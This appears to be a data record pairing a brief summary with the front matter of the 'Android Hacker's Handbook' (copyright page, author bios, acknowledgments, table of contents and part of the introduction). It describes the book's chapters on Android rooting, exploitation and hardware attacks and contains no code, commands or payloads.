[
  {
    "input": "",
    "summary": "The *Android™ Hacker’s Handbook* explores the Android ecosystem, detailing its stakeholders (Google, hardware vendors, carriers, developers, and security researchers) and the challenges",
    "output": "ffi rs.indd 01:50:14:PM 02/28/2014 Page ii\nAndroid™ Hacker’s Handbook\nffi rs.indd 01:50:14:PM 02/28/2014 Page i\nffi rs.indd 01:50:14:PM 02/28/2014 Page ii\nAndroid™ Hacker’s\nHandbook\nJoshua J. Drake\nPau Oliva Fora\nZach Lanier\nCollin Mulliner\nStephen A. Ridley\nGeorg Wicherski\nffi rs.indd 01:50:14:PM 02/28/2014 Page iii\nAndroid™ Hacker’s Handbook\nPublished by\nJohn Wiley & Sons, Inc.\n10475 Crosspoint Boulevard\nIndianapolis, IN 46256\nwww.wiley.com\nCopyright © 2014 by John Wiley & Sons, Inc., Indianapolis, Indiana\nISBN: 978-1-118-60864-7\nISBN: 978-1-118-60861-6 (ebk)\nISBN: 978-1-118-92225-5 (ebk)\nManufactured in the United States of America\n10 9 8 7 6 5 4 3 2 1\nNo part of this publication may be reproduced, stored in a retrieval system or transmitted in any form or by any means,\nelectronic, mechanical, photocopying, recording, scanning or otherwise, except as permitted under Sections 107 or\n108 of the 1976 United States Copyright Act, without either the prior written permission of the Publisher, or autho-\nrization through payment of the appropriate per-copy fee to the Copyright Clearance Center, 222 Rosewood Drive,\nDanvers, MA 01923, (978) 750-8400, fax (978) 646-8600. Requests to the Publisher for permission should be addressed\nto the Permissions Department, John Wiley & Sons, Inc., 111 River Street, Hoboken, NJ 07030, (201) 748-6011, fax (201)\n748-6008, or online at http://www.wiley.com/go/permissions.\nLimit of Liability/Disclaimer of Warranty: The publisher and the author make no representations or warranties with\nrespect to the accuracy or completeness of the contents of this work and specifi cally disclaim all warranties, including\nwithout limitation warranties of fi tness for a particular purpose. No warranty may be created or extended by sales or\npromotional materials. The advice and strategies contained herein may not be suitable for every situation. This work\nis sold with the understanding that the publisher is not engaged in rendering legal, accounting, or other professional\nservices. If professional assistance is required, the services of a competent professional person should be sought.\nNeither the publisher nor the author shall be liable for damages arising herefrom. The fact that an organization or\nWeb site is referred to in this work as a citation and/or a potential source of further information does not mean that\nthe author or the publisher endorses the information the organization or Web site may provide or recommendations\nit may make. Further, readers should be aware that Internet Web sites listed in this work may have changed or disap-\npeared between when this work was written and when it is read.\nFor general information on our other products and services please contact our Customer Care Department within the\nUnited States at (877) 762-2974, outside the United States at (317) 572-3993 or fax (317) 572-4002.\nWiley publishes in a variety of print and electronic formats and by print-on-demand. Some material included with\nstandard print versions of this book may not be included in e-books or in print-on-demand. If this book refers to media\nsuch as a CD or DVD that is not included in the version you purchased, you may download this material at http://\nbooksupport.wiley.com. For more information about Wiley products, visit www.wiley.com.\nLibrary of Congress Control Number: 2013958298\nTrademarks: Wiley and the Wiley logo are trademarks or registered trademarks of John Wiley & Sons, Inc. and/or\nits affi liates, in the United States and other countries, and may not be used without written permission. Android is a\ntrademark of Google, Inc. All other trademarks are the property of their respective owners. John Wiley & Sons, Inc.,\nis not associated with any product or vendor mentioned in this book.\nffi rs.indd 01:50:14:PM 02/28/2014 Page iv\nAbout the Authors\nJoshua J. Drake is a Director of Research Science at Accuvant LABS. Joshua\nfocuses on original research in areas such as reverse engineering and the analy-\nsis, discovery, and exploitation of security vulnerabilities. He has over 10 years\nof experience in the information security fi eld including researching Linux\nsecurity since 1994, researching Android security since 2009, and consulting\nwith major Android OEMs since 2012. In prior roles, he served at Metasploit\nand VeriSign’s iDefense Labs. At BlackHat USA 2012, Georg and Joshua demon-\nstrated successfully exploiting the Android 4.0.1 browser via NFC. Joshua spoke\nat REcon, CanSecWest, RSA, Ruxcon/Breakpoint, Toorcon, and DerbyCon. He\nwon Pwn2Own in 2013 and won the DefCon 18 CTF with the ACME Pharm\nteam in 2010.\nPau Oliva Fora is a Mobile Security Engineer with viaForensics. He has pre-\nviously worked as R+D Engineer in a wireless provider. He has been actively\nresearching security aspects on the Android operating system since its debut\nwith the T-Mobile G1 on October 2008. His passion for smartphone security has\nmanifested itself not just in the numerous exploits and tools he has authored\nbut in other ways, such as serving as a moderator for the very popular XDA-\nDevelopers forum even before Android existed. In his work, he has provided\nconsultation to major Android OEMs. His close involvement with and observa-\ntion of the mobile security communities has him particularly excited to be a\npart of pulling together a book of this nature.\nZach Lanier is a Senior Security Researcher at Duo Security. Zach has\nbeen involved in various areas of information security for over 10 years. He\nhas been conducting mobile and embedded security research since 2009,\nv\nffi rs.indd 01:50:14:PM 02/28/2014 Page v\nvi About the Authors\nranging from app security, to platform security (especially Android), to device,\nnetwork, and carrier security. His areas of research interest include both\noffensive and defensive techniques, as well as privacy-enhancing technologies.\nHe has presented at various public and private industry conferences, such\nas BlackHat, DEFCON, ShmooCon, RSA, Intel Security Conference, Amazon\nZonCon, and more.\nCollin Mulliner is a postdoctoral researcher at Northeastern University. His\nmain interest lies in security and privacy of mobile and embedded systems with\nan emphasis on mobile and smartphones. His early work dates back to 1997, when\nhe developed applications for Palm OS. Collin is known for his work on the (in)\nsecurity of the Multimedia Messaging Service (MMS) and the Short Message\nService (SMS). In the past he was mostly interested in vulnerability analysis and\noffensive security but recently switched his focus the defensive side to develop\nmitigations and countermeasures. Collin received a Ph.D. in computer science\nfrom Technische Universität Berlin; earlier he completed his M.S. and B.S. in\ncomputer science at UC Santa Barbara and FH Darmstadt.\nRidley (as his colleagues refer to him) is a security researcher and author with\nmore than 10 years of experience in software development, software security, and\nreverse engineering. In that last few years Stephen has presented his research\nand spoken about reverse engineering and software security on every continent\n(except Antarctica). Previously Stephen served as the Chief Information Security\nOffi cer of Simple.com, a new kind of online bank. Before that, Stephen was\nsenior researcher at Matasano Security and a founding member of the Security\nand Mission Assurance (SMA) group at a major U.S defense contractor, where\nhe specialized in vulnerability research, reverse engineering, and “offensive\nsoftware” in support of the U.S. Defense and Intelligence community. At pres-\nent, Stephen is principal researcher at Xipiter (an information security R&D\nfi rm that has also developed a new kind of low-power smart-sensor device).\nRecently, Stephen and his work have been featured on NPR and NBC and in\nWired, the Washington Post, Fast Company, VentureBeat, Slashdot, The Register, and\nother publications.\nGeorg Wicherski is Senior Security Researcher at CrowdStrike. Georg\nparticularly enjoys tinkering with the low-level parts in computer security;\nhand-tuning custom-written shellcode and getting the last percent in exploit\nreliability stable. Before joining CrowdStrike, Georg worked at Kaspersky and\nMcAfee. At BlackHat USA 2012, Joshua and Georg demonstrated successfully\nexploiting the Android 4.0.1 browser via NFC. He spoke at REcon, SyScan,\nBlackHat USA and Japan, 26C3, ph-Neutral, INBOT, and various other confer-\nences. With his local CTF team 0ldEur0pe, he participated in countless and won\nnumerous competitions.\nffi rs.indd 01:50:14:PM 02/28/2014 Page vi\nAbout the Technical Editor\nRob Shimonski (www.shimonski.com) is a best-selling author and editor with\nover 15 years’ experience developing, producing and distributing print media\nin the form of books, magazines, and periodicals. To date, Rob has successfully\ncreated over 100 books that are currently in circulation. Rob has worked for\ncountless companies that include CompTIA, Microsoft, Wiley, McGraw Hill\nEducation, Cisco, the National Security Agency, and Digidesign.\nRob has over 20 years’ experience working in IT, networking, systems, and\nsecurity. He is a veteran of the US military and has been entrenched in security\ntopics for his entire professional career. In the military Rob was assigned to a\ncommunications (radio) battalion supporting training efforts and exercises.\nHaving worked with mobile phones practically since their inception, Rob is an\nexpert in mobile phone development and security.\nvii\nffi rs.indd 01:50:14:PM 02/28/2014 Page vii\nffi rs.indd 01:50:14:PM 02/28/2014 Page viii\nCredits\nExecutive Editor Marketing Manager\nCarol Long Ashley Zurcher\nProject Editors Business Manager\nEd Connor Amy Knies\nSydney Jones Argenta\nVice President and Executive\nTechnical Editor Group Publisher\nRob Shimonski Richard Swadley\nProduction Editor Associate Publisher\nDaniel Scribner Jim Minatel\nCopy Editor Project Coordinator, Cover\nCharlotte Kughen Todd Klemme\nEditorial Manager Proofreaders\nMary Beth Wakefi eld Mark Steven Long\nJosh Chase, Word One\nFreelancer Editorial Manager\nRosemarie Graham Indexer\nRon Strauss\nAssociate Director of Marketing\nDavid Mayhew Cover Designer\nWiley\nCover Image\nThe Android robot is reproduced or modifi ed from work created and shared\nby Google and used according to terms described in the Creative Commons\n3.0 Attribution License.\nix\nffi rs.indd 01:50:14:PM 02/28/2014 Page ix\nffi rs.indd 01:50:14:PM 02/28/2014 Page x\nAcknowledgments\nI thank my family, especially my wife and son, for their tireless support and\naffection during this project. I thank my peers from both industry and academia;\ntheir research efforts push the boundary of public knowledge. I extend my\ngratitude to: my esteemed coauthors for their contributions and candid discus-\nsions, Accuvant for having the grace to let me pursue this and other endeavors,\nand Wiley for spurring this project and guiding us along the way. Last, but not\nleast, I thank the members of #droidsec, the Android Security Team, and the\nQualcomm Security Team for pushing Android security forward.\n— Joshua J. Drake\nI’d like to thank Iolanda Vilar for pushing me into writing this book and sup-\nporting me during all the time I’ve been away from her at the computer. Ricard\nand Elena for letting me pursue my passion when I was a child. Wiley and all\nthe coauthors of this book, for the uncountable hours we’ve been working on this\ntogether, and specially Joshua Drake for all the help with my broken English. The\ncolleagues at viaForensics for the awesome technical research we do together.\nAnd fi nally all the folks at #droidsec irc channel, the Android Security com-\nmunity in G+, Nopcode, 48bits, and everyone who I follow on Twitter; without\nyou I wouldn’t be able to keep up with all the advances in mobile security.\n— Pau Oliva\nxi\nffi rs.indd 01:50:14:PM 02/28/2014 Page xi\nxii Acknowledgments\nI would like to thank Sally, the love of my life, for putting up with me; my\nfamily for encouraging me; Wiley/Carol/Ed for the opportunity; my coauthors\nfor sharing this arduous but awesome journey; Ben Nell, Craig Ingram, Kelly\nLum, Chris Valasek, Jon Oberheide, Loukas K., Chris Valasek, John Cran, and\nPatrick Schulz for their support and feedback; and other friends who’ve helped\nand supported me along the way, whether either of us knows it or not.\n— Zach Lanier\nI would like to thank my girlfriend Amity, my family, and my friends and\ncolleagues for their continued support. Further, I would like to thank my advi-\nsors for providing the necessary time to work on the book. Special thanks to\nJoshua for making this book happen.\n— Collin Mulliner\nNo one deserves more thanks than my parents: Hiram O. Russell, and Imani\nRussell, and my younger siblings: Gabriel Russell and Mecca Russell. A great\ndeal of who (and what) I am, is owed to the support and love of my family. Both\nof my parents encouraged me immensely and my brother and sister never cease\nto impress me in their intellect, accomplishments, and quality as human beings.\nYou all are what matter most to me. I would also like to thank my beautiful fi an-\ncée, Kimberly Ann Hartson, for putting up with me through this whole process\nand being such a loving and calming force in my life. Lastly, I would like to\nthank the information security community at large. The information security\ncommunity is a strange one, but one I “grew up” in nonetheless. Colleagues\nand researchers (including my coauthors) are a source of constant inspiration\nand provide me with the regular sources of news, drama, and aspirational goals\nthat keep me interested in this kind of work. I am quite honored to have been\ngiven the opportunity to collaborate on this text.\n— Stephen A. Ridley\nI sincerely thank my wife, Eva, and son, Jonathan, for putting up with me\nspending time writing instead of caring for them. I love you two. I thank Joshua\nfor herding cats to make this book happen.\n— Georg Wicherski\nffi rs.indd 01:50:14:PM 02/28/2014 Page xii\nContents at a Glance\nIntroduction xxv\nChapter 1 Looking at the Ecosystem 1\nChapter 2 Android Security Design and Architecture 25\nChapter 3 Rooting Your Device 57\nChapter 4 Reviewing Application Security 83\nChapter 5 Understanding Android’s Attack Surface 129\nChapter 6 Finding Vulnerabilities with Fuzz Testing 177\nChapter 7 Debugging and Analyzing Vulnerabilities 205\nChapter 8 Exploiting User Space Software 263\nChapter 9 Return Oriented Programming 291\nChapter 10 Hacking and Attacking the Kernel 309\nChapter 11 Attacking the Radio Interface Layer 367\nChapter 12 Exploit Mitigations 391\nChapter 13 Hardware Attacks 423\nAppendix A Tool Catalog 485\nAppendix B Open Source Repositories 501\nAppendix C References 511\nIndex 523\nxiii\nffi rs.indd 01:50:14:PM 02/28/2014 Page xiii\nffi rs.indd 01:50:14:PM 02/28/2014 Page xiv\nContents\nIntroduction xxv\nChapter 1 Looking at the Ecosystem 1\nUnderstanding Android’s Roots 1\nCompany History 2\nVersion History 2\nExamining the Device Pool 4\nOpen Source, Mostly 7\nUnderstanding Android Stakeholders 7\nGoogle 8\nHardware Vendors 10\nCarriers 12\nDevelopers 13\nUsers 14\nGrasping Ecosystem Complexities 15\nFragmentation 16\nCompatibility 17\nUpdate Issues 18\nSecurity versus Openness 21\nPublic Disclosures 22\nSummary 23\nChapter 2 Android Security Design and Architecture 25\nUnderstanding Android System Architecture 25\nUnderstanding Security Boundaries and Enforcement 27\nAndroid’s Sandbox 27\nAndroid Permissions 30\nLooking Closer at the Layers 34\nAndroid Applications 34\nThe Android Framework 39\nxv\nftoc.indd 09:50:43:PM 03/04/2014 Page xv\nxvi Contents\nThe Dalvik Virtual Machine 40\nUser-Space Native Code 41\nThe Kernel 49\nComplex Security, Complex Exploits 55\nSummary 56\nChapter 3 Rooting Your Device 57\nUnderstanding the Partition Layout 58\nDetermining the Partition Layout 59\nUnderstanding the Boot Process 60\nAccessing Download Mode 61\nLocked and Unlocked Boot Loaders 62\nStock and Custom Recovery Images 63\nRooting with an Unlocked Boot Loader 65\nRooting with a Locked Boot Loader 68\nGaining Root on a Booted System 69\nNAND Locks, Temporary Root, and Permanent Root 70\nPersisting a Soft Root 71\nHistory of Known Attacks 73\nKernel: Wunderbar/asroot 73\nRecovery: Volez 74\nUdev: Exploid 74\nAdbd: RageAgainstTheCage 75\nZygote: Zimperlich and Zysploit 75\nAshmem: KillingInTheNameOf and psneuter 76\nVold: GingerBreak 76\nPowerVR: levitator 77\nLibsysutils: zergRush 78\nKernel: mempodroid 78\nFile Permission and Symbolic Link–Related Attacks 79\nAdb Restore Race Condition 79\nExynos4: exynos-abuse 80\nDiag: lit / diaggetroot 81\nSummary 81\nChapter 4 Reviewing Application Security 83\nCommon Issues 83\nApp Permission Issues 84\nInsecure Transmission of Sensitive Data 86\nInsecure Data Storage 87\nInformation Leakage Through Logs 88\nUnsecured IPC Endpoints 89\nCase Study: Mobile Security App 91\nProfi ling 91\nStatic Analysis 93\nDynamic Analysis 109\nAttack 117\nftoc.indd 09:50:43:PM 03/04/2014 Page xvi\nContents xvii\nCase Study: SIP Client 120\nEnter Drozer 121\nDiscovery 121\nSnarfi ng 122\nInjection 124\nSummary 126\nChapter 5 Understanding Android’s Attack Surface 129\nAn Attack Terminology Primer 130\nAttack Vectors 130\nAttack Surfaces 131\nClassifying Attack Surfaces 133\nSurface Properties 133\nClassifi cation Decisions 134\nRemote Attack Surfaces 134\nNetworking Concepts 134\nNetworking Stacks 139\nExposed Network Services 140\nMobile Technologies 142\nClient-side Attack Surface 143\nGoogle Infrastructure 148\nPhysical Adjacency 154\nWireless Communications 154\nOther Technologies 161\nLocal Attack Surfaces 161\nExploring the File System 162\nFinding Other Local Attack Surfaces 163\nPhysical Attack Surfaces 168\nDismantling Devices 169\nUSB 169\nOther Physical Attack Surfaces 173\nThird-Party Modifi cations 174\nSummary 174\nChapter 6 Finding Vulnerabilities with Fuzz Testing 177\nFuzzing Background 177\nIdentifying a Target 179\nCrafting Malformed Inputs 179\nProcessing Inputs 180\nMonitoring Results 181\nFuzzing on Android 181\nFuzzing Broadcast Receivers 183\nIdentifying a Target 183\nGenerating Inputs 184\nDelivering Inputs 185\nMonitoring Testing 185\nftoc.indd 09:50:43:PM 03/04/2014 Page xvii\nxviii Contents\nFuzzing Chrome for Android 188\nSelecting a Technology to Target 188\nGenerating Inputs 190\nProcessing Inputs 192\nMonitoring Testing 194\nFuzzing the USB Attack Surface 197\nUSB Fuzzing Challenges 198\nSelecting a Target Mode 198\nGenerating Inputs 199\nProcessing Inputs 201\nMonitoring Testing 202\nSummary 204\nChapter 7 Debugging and Analyzing Vulnerabilities 205\nGetting All Available Information 205\nChoosing a Toolchain 207\nDebugging with Crash Dumps 208\nSystem Logs 208\nTombstones 209\nRemote Debugging 211\nDebugging Dalvik Code 212\nDebugging an Example App 213\nShowing Framework Source Code 215\nDebugging Existing Code 217\nDebugging Native Code 221\nDebugging with the NDK 222\nDebugging with Eclipse 226\nDebugging with AOSP 227\nIncreasing Automation 233\nDebugging with Symbols 235\nDebugging with a Non-AOSP Device 241\nDebugging Mixed Code 243\nAlternative Debugging Techniques 243\nDebug Statements 243\nOn-Device Debugging 244\nDynamic Binary Instrumentation 245\nVulnerability Analysis 246\nDetermining Root Cause 246\nJudging Exploitability 260\nSummary 261\nChapter 8 Exploiting User Space Software 263\nMemory Corruption Basics 263\nStack Buffer Overfl ows 264\nHeap Exploitation 268\nftoc.indd 09:50:43:PM 03/04/2014 Page xviii\nContents xix\nA History of Public Exploits 275\nGingerBreak 275\nzergRush 279\nmempodroid 283\nExploiting the Android Browser 284\nUnderstanding the Bug 284\nControlling the Heap 287\nSummary 290\nChapter 9 Return Oriented Programming 291\nHistory and Motivation 291\nSeparate Code and Instruction Cache 292\nBasics of ROP on ARM 294\nARM Subroutine Calls 295\nCombining Gadgets into a Chain 297\nIdentifying Potential Gadgets 299\nCase Study: Android 4.0.1 Linker 300\nPivoting the Stack Pointer 301\nExecuting Arbitrary Code from a New Mapping 303\nSummary 308\nChapter 10 Hacking and Attacking the Kernel 309\nAndroid’s Linux Kernel 309\nExtracting Kernels 310\nExtracting from Stock Firmware 311\nExtracting from Devices 314\nGetting the Kernel from a Boot Image 315\nDecompressing the Kernel 316\nRunning Custom Kernel Code 316\nObtaining Source Code 316\nSetting Up a Build Environment 320\nConfi guring the Kernel 321\nUsing Custom Kernel Modules 322\nBuilding a Custom Kernel 325\nCreating a Boot Image 329\nBooting a Custom Kernel 331\nDebugging the Kernel 336\nObtaining Kernel Crash Reports 337\nUnderstanding an Oops 338\nLive Debugging with KGDB 343\nExploiting the Kernel 348\nTypical Android Kernels 348\nExtracting Addresses 350\nCase Studies 352\nSummary 364\nftoc.indd 09:50:43:PM 03/04/2014 Page xix\nxx Contents\nChapter 11 Attacking the Radio Interface Layer 367\nIntroduction to the RIL 368\nRIL Architecture 368\nSmartphone Architecture 369\nThe Android Telephony Stack 370\nTelephony Stack Customization 371\nThe RIL Daemon (rild) 372\nThe Vendor-RIL API 374\nShort Message Service (SMS) 375\nSending and Receiving SMS Messages 376\nSMS Message Format 376\nInteracting with the Modem 379\nEmulating the Modem for Fuzzing 379\nFuzzing SMS on Android 382\nSummary 390\nChapter 12 Exploit Mitigations 391\nClassifying Mitigations 392\nCode Signing 392\nHardening the Heap 394\nProtecting Against Integer Overfl ows 394\nPreventing Data Execution 396\nAddress Space Layout Randomization 398\nProtecting the Stack 400\nFormat String Protections 401\nRead-Only Relocations 403\nSandboxing 404\nFortifying Source Code 405\nAccess Control Mechanisms 407\nProtecting the Kernel 408\nPointer and Log Restrictions 409\nProtecting the Zero Page 410\nRead-Only Memory Regions 410\nOther Hardening Measures 411\nSummary of Exploit Mitigations 414\nDisabling Mitigation Features 415\nChanging Your Personality 416\nAltering Binaries 416\nTweaking the Kernel 417\nOvercoming Exploit Mitigations 418\nOvercoming Stack Protections 418\nOvercoming ASLR 418\nOvercoming Data Execution Protections 419\nOvercoming Kernel Protections 419\nftoc.indd 09:50:43:PM 03/04/2014 Page xx\nContents xxi\nLooking to the Future 420\nOffi cial Projects Underway 420\nCommunity Kernel Hardening Efforts 420\nA Bit of Speculation 422\nSummary 422\nChapter 13 Hardware Attacks 423\nInterfacing with Hardware Devices 424\nUART Serial Interfaces 424\nI2C, SPI, and One-Wire Interfaces 428\nJTAG 431\nFinding Debug Interfaces 443\nIdentifying Components 456\nGetting Specifi cations 456\nDiffi culty Identifying Components 457\nIntercepting, Monitoring, and Injecting Data 459\nUSB 459\nI2C, SPI, and UART Serial Interfaces 463\nStealing Secrets and Firmware 469\nAccessing Firmware Unobtrusively 469\nDestructively Accessing the Firmware 471\nWhat Do You Do with a Dump? 474\nPitfalls 479\nCustom Interfaces 479\nBinary/Proprietary Data 479\nBlown Debug Interfaces 480\nChip Passwords 480\nBoot Loader Passwords, Hotkeys, and Silent Terminals 480\nCustomized Boot Sequences 481\nUnexposed Address Lines 481\nAnti-Reversing Epoxy 482\nImage Encryption, Obfuscation, and Anti-Debugging 482\nSummary 482\nAppendix A Tool Catalog 485\nDevelopment Tools 485\nAndroid SDK 485\nAndroid NDK 486\nEclipse 486\nADT Plug-In 486\nADT Bundle 486\nAndroid Studio 487\nFirmware Extraction and Flashing Tools 487\nBinwalk 487\nfastboot 487\nftoc.indd 09:50:43:PM 03/04/2014 Page xxi\nxxii Contents\nSamsung 488\nNVIDIA 489\nLG 489\nHTC 489\nMotorola 490\nNative Android Tools 491\nBusyBox 491\nsetpropex 491\nSQLite 491\nstrace 492\nHooking and Instrumentation Tools 492\nADBI Framework 492\nldpreloadhook 492\nXPosed Framework 492\nCydia Substrate 493\nStatic Analysis Tools 493\nSmali and Baksmali 493\nAndroguard 493\napktool 494\ndex2jar 494\njad 494\nJD-GUI 495\nJEB 495\nRadare2 495\nIDA Pro and Hex-Rays Decompiler 496\nApplication Testing Tools 496\nDrozer (Mercury) Framework 496\niSEC Intent Sniffer and Intent Fuzzer 496\nHardware Hacking Tools 496\nSegger J-Link 497\nJTAGulator 497\nOpenOCD 497\nSaleae 497\nBus Pirate 497\nGoodFET 497\nTotal Phase Beagle USB 498\nFacedancer21 498\nTotal Phase Beagle I2C 498\nChip Quik 498\nHot air gun 498\nXeltek SuperPro 498\nIDA 499\nAppendix B Open Source Repositories 501\nGoogle 501\nAOSP 501\nGerrit Code Review 502\nftoc.indd 09:50:43:PM 03/04/2014 Page xxii\nContents xxiii\nSoC Manufacturers 502\nAllWinner 503\nIntel 503\nMarvell 503\nMediaTek 504\nNvidia 504\nTexas Instruments 504\nQualcomm 505\nSamsung 505\nOEMs 506\nASUS 506\nHTC 507\nLG 507\nMotorola 507\nSamsung 508\nSony Mobile 508\nUpstream Sources 508\nOthers 509\nCustom Firmware 509\nLinaro 510\nReplicant 510\nCode Indexes 510\nIndividuals 510\nAppendix C References 511\nIndex 523\nftoc.indd 09:50:43:PM 03/04/2014 Page xxiii\nfl ast.indd 01:24:53:PM 02/24/2014 Page xxiv\nIntroduction\nLike most disciplines, information security began as a cottage industry. It is has\ngrown organically from hobbyist pastime into a robust industry replete with\nexecutive titles, “research and development” credibility, and the ear of academia\nas an industry where seemingly aloof fi elds of study such as number theory,\ncryptography, natural language processing, graph theory, algorithms, and niche\ncomputer science can be applied with a great deal of industry impact. Information\nsecurity is evolving into a proving ground for some of these fascinating fi elds of\nstudy. Nonetheless, information security (specifi cally “vulnerability research”)\nis bound to the information technology sector as a whole and therefore follows\nthe same trends.\nAs we all very well know from our personal lives, mobile computing is quite\nobviously one of the greatest recent areas of growth in the information tech-\nnology. More than ever, our lives are chaperoned by our mobile devices, much\nmore so than the computers we leave on our desks at close of business or leave\nclosed on our home coffee tables when we head into our offi ces in the morning.\nUnlike those devices, our mobile devices are always on, taken between these\ntwo worlds, and are hence much more valuable targets for malicious actors.\nUnfortunately information security has been slower to follow suit, with\nonly a recent shift toward the mobile space. As a predominantly “reactionary”\nindustry, information security has been slow (at least publicly) to catch up to\nmobile/embedded security research and development. To some degree mobile\nsecurity is still considered cutting edge, because consumers and users of mobile\ndevices are only just recently beginning to see and comprehend the threats\nassociated with our mobile devices. These threats have consequently created a\nmarket for security research and security products.\nxxv\nfl ast.indd 01:24:53:PM 02/24/2014 Page xxv\nxxvi Introduction\nFor information security researchers, the mobile space also represents a\nfairly new and sparsely charted continent to explore, with diverse geography\nin the form of different processor architectures, hardware peripherals, software\nstacks, and operating systems. All of these create an ecosystem for a diverse set\nof vulnerabilities to exploit and study.\nAccording to IDC, Android market share in Q3 2012 was 75 percent of the\nworldwide market (as calculated by shipment volume) with 136 million units\nshipped. Apple’s iOS had 14.9 percent of the market in the same quarter, BlackBerry\nand Symbian followed behind with 4.3 percent and 2.3 percent respectively. After\nQ3 2013, Android’s number had risen to 81 percent, with iOS at 12.9 percent and\nthe remaining 6.1 percent scattered among the other mobile operating systems.\nWith that much market share, and a host of interesting information security\nincidents and research happening in the Android world, we felt a book of this\nnature was long overdue.\nWiley has published numerous books in the Hacker’s Handbook series, including\nthe titles with the terms “Shellcoder’s,” “Mac,” “Database,” “Web Application,”\n“iOS,” and “Browser” in their names. The Android Hacker’s Handbook represents\nthe latest installment in the series and builds on the information within the\nentire collection.\nOverview of the Book and Technology\nThe Android Hacker’s Handbook team members chose to write this book because\nthe fi eld of mobile security research is so “sparsely charted” with disparate and\nconfl icted information (in the form of resources and techniques). There have been\nsome fantastic papers and published resources that feature Android, but much\nof what has been written is either very narrow (focusing on a specifi c facet of\nAndroid security) or mentions Android only as an ancillary detail of a security\nissue regarding a specifi c mobile technology or embedded device. Further, public\nvulnerability information surrounding Android is scarce. Despite the fact that\n1,000 or more publicly disclosed vulnerabilities affect Android devices, multiple\npopular sources of vulnerability information report fewer than 100. The team\nbelieves that the path to improving Android’s security posture starts by under-\nstanding the technologies, concepts, tools, techniques, and issues in this book.\nHow This Book Is Organized\nThis book is intended to be readable cover to cover, but also serves as an indexed\nreference for anyone hacking on Android or doing information security research\non an Android-based device. We’ve organized the book into 13 chapters to cover\nfl ast.indd 01:24:53:PM 02/24/2014 Page xxvi\nIntroduction xxvii\nvirtually everything one would need to know to fi rst approach Android for\nsecurity research. Chapters include diagrams, photographs, code snippets, and\ndisassembly to explain the Android software and hardware environment and\nconsequently the nuances of software exploitation and reverse engineering on\nAndroid. The general outline of this book begins with broader topics and ends\nwith deeply technical information. The chapters are increasingly specifi c and\nlead up to discussions of advanced security research topics such as discover-\ning, analyzing, and attacking Android devices. Where applicable, this book\nrefers to additional sources of detailed documentation. This allows the book to\nfocus on technical explanations and details relevant to device rooting, reverse\nengineering, vulnerability research, and software exploitation.\n■ Chapter 1 introduces the ecosystem surrounding Android mobile devices.\nAfter revisiting historical facts about Android, the chapter takes a look at\nthe general software composition, the devices in public circulation, and\nthe key players in the supply chain. It concludes with a discussion of\nhigh-level diffi culties that challenge the ecosystem and impede Android\nsecurity research.\n■ Chapter 2 examines Android operating system fundamentals. It begins\nwith an introduction to the core concepts used to keep Android devices\nsecure. The rest of the chapter dips into the internals of the most security-\ncritical components.\n■ Chapter 3 explains the motivations and methods for gaining unimpeded\naccess to an Android device. It starts by covering and guiding you through\ntechniques that apply to a wide range of devices. Then it presents mod-\nerately detailed information about more than a dozen individually\npublished exploits.\n■ Chapter 4 pertains to security concepts and techniques specifi c to Android\napplications. After discussing common security-critical mistakes made\nduring development, it walks you through the tools and processes used\nto fi nd such issues.\n■ Chapter 5 introduces key terminology used to describe attacks against\nmobile devices and explores the many ways that an Android device can\nbe attacked.\n■ Chapter 6 shows how to fi nd vulnerabilities in software that runs on\nAndroid by using a technique known as fuzz testing. It starts by discussing\nthe high-level process behind fuzzing. The rest of the chapter takes a look\nat how applying these processes toward Android can aid in discovering\nsecurity issues.\n■ Chapter 7 is about analyzing and understanding bugs and security vul-\nnerabilities in Android. It fi rst presents techniques for debugging the\nfl ast.indd 01:24:53:PM 02/24/2014 Page xxvii\nxxviii Introduction\ndifferent types of code found in Android. It concludes with an analysis\nof an unpatched security issue in the WebKit-based web browser.\n■ Chapter 8 looks at how you can exploit memory corruption vulnerabilities\non Android devices. It covers compiler and operating system internals, like\nAndroid’s heap implementation, and ARM system architecture specifi cs.\nThe last part of this chapter takes a close look at how several published\nexploits work.\n■ Chapter 9 focuses on an advanced exploitation technique known as\nReturn Oriented Programming (ROP). It further covers ARM system\narchitecture and explains why and how to apply ROP. It ends by taking\na more detailed look at one particular exploit.\n■ Chapter 10 digs deeper into the inner workings of the Android operating\nsystem with information about the kernel. It begins by explaining how\nto hack, in the hobbyist sense, the Android kernel. This includes how to\ndevelop and debug kernel code. Finally, it shows you how to exploit a\nfew publicly disclosed vulnerabilities.\n■ Chapter 11 jumps back to user-space to discuss a particularly important\ncomponent unique to Android smartphones: the Radio Interface Layer\n(RIL). After discussing architectural details, this chapter covers how you\ncan interact with RIL components to fuzz the code that handles Short\nMessage Service (SMS) messages on an Android device.\n■ Chapter 12 details security protection mechanisms present in the Android\noperating system. It begins with a perspective on when such protections\nwere invented and introduced in Android. It explains how these protec-\ntions work at various levels and concludes with techniques for overcoming\nand circumventing them.\n■ Chapter 13 dives into methods and techniques for attacking Android, and\nother embedded devices, through their hardware. It starts by explaining\nhow to identify, monitor, and intercept various bus-level communications.\nIt shows how these methods can enable further attacks against hard-to-\nreach system components. It ends with tips and tricks for avoiding many\ncommon hardware hacking pitfalls.\nWho Should Read This Book\nThe intended audience of this book is anyone who wants to gain a better\nunderstanding of Android security. Whether you are a software developer, an\nembedded system designer, a security architect, or a security researcher, this\nbook will improve your understanding of the Android security landscape.\nfl ast.indd 01:24:53:PM 02/24/2014 Page xxviii\nIntroduction xxix\nThough some of the chapters are approachable to a wide audience, the bulk of\nthis book is better digested by someone with a fi rm grasp on computer software\ndevelopment and security. Admittedly, some of the more technical chapters\nare better suited to readers who are knowledgeable in topics such as assembly\nlanguage programming and reverse engineering. However, less experienced\nreaders who have suffi cient motivation stand to learn a great deal from taking\nthe more challenging parts of the book head on.\nTools You Will Need\nThis book alone will be enough for you to get a basic grasp of the inner workings\nof the Android OS. However, readers who want to follow the presented code\nand workfl ows should prepare by gathering a few items. First and foremost,\nan Android device is recommended. Although a virtual device will suffi ce for\nmost tasks, you will be better off with a physical device from the Google Nexus\nfamily. Many of the chapters assume you will use a development machine with\nUbuntu 12.04. Finally, the Android Software Developers Kit (SDK), Android\nNative Development Kit (NDK), and a complete checkout of the Android Open\nSource Project (AOSP) are recommended for following along with the more\nadvanced chapters.\nWhat’s on the Website\nAs stated earlier, this book is intended to be a one-stop resource for current\nAndroid information security research and development. While writing this\nbook, we developed code that supplements the material. You can download\nthis supplementary material from the book’s website at www.wiley.com/\ngo/androidhackershandbook/.\nBon Voyage\nWith this book in your hand, you’re ready to embark on a journey 